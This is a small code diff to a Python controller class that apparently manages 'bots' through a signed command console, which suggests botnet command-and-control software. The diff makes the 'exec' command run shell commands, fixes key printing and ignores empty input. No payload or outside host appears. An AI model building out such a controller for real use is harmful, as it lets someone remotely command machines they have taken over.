@@ -26,7 +26,7 @@ class Controller:
         self.last_ping = None
 
         self.signing_key = SigningKey(base64.b64decode(signing_seed.encode("utf-8")))
-        print(f"Verify key: {base64.b64encode(self.signing_key.verify_key.encode())}")
+        print(f"Verify key: {base64.b64encode(self.signing_key.verify_key.encode()).decode('utf-8')}")
 
         self.bots = {}
         self.bots_lock = threading.Lock()
@@ -163,7 +163,9 @@ class Controller:
             elif command == "bot":
                 self.select_bot(args[1:])
             elif command == "exec":
-                self.execute_binary(args[1:])
+                self.execute_command(args[1:])
+            elif command == "":
+                continue
             else:
                 print("Invalid command. For a list of available commands enter 'help'.")
 
